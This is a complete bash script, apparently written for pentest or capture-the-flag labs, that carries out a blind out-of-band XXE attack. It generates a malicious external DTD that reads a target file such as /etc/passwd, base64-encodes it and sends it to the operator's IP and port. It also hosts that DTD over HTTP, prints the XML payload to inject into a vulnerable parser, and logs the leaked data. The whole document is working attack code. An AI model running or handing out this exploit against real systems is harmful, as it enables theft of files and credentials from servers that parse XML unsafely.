#!/usr/bin/env bash
# xxe-oob — host an external DTD for blind/OOB XXE and catch the exfil.
#
# Builds evil.dtd that reads a target file and beacons it back base64-wrapped
# in a request path, serves it over HTTP, and tails the hits so you see the
# leaked file. Pair with the OOB payload in the XXE phase.
#
# Usage:   ./xxe-oob.sh <your_ip> <port> [remote_file_to_read]
# Example: ./xxe-oob.sh 10.10.14.5 9001 /etc/passwd
#
# Then send this to the XML sink (uses the SAME ip:port):
#   <?xml version="1.0"?>
#   <!DOCTYPE r [<!ENTITY % ext SYSTEM "http://<ip>:<port>/evil.dtd"> %ext;]>
#   <r>&send;</r>
set -euo pipefail

IP="${1:?usage: xxe-oob.sh <ip> <port> [file]}"
PORT="${2:?usage: xxe-oob.sh <ip> <port> [file]}"
FILE="${3:-/etc/passwd}"
DIR="$(mktemp -d)"

cat > "$DIR/evil.dtd" <<EOF
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=${FILE}">
<!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'http://${IP}:${PORT}/leak?d=%file;'>">
%eval;
EOF

echo "[*] evil.dtd (reading ${FILE}):"
sed 's/^/    /' "$DIR/evil.dtd"
echo
echo "[*] Send this payload to the XML sink:"
cat <<EOF
    <?xml version="1.0"?>
    <!DOCTYPE r [<!ENTITY % ext SYSTEM "http://${IP}:${PORT}/evil.dtd"> %ext;]>
    <r>&send;</r>
EOF
echo
echo "[*] Serving $DIR on ${IP}:${PORT} — watch for GET /leak?d=... (base64-decode d to read the file). Ctrl-C to stop."
cd "$DIR"
# python's server logs each request line to stderr, which is all we need to read the leak.
exec python3 -m http.server "$PORT" --bind "$IP"
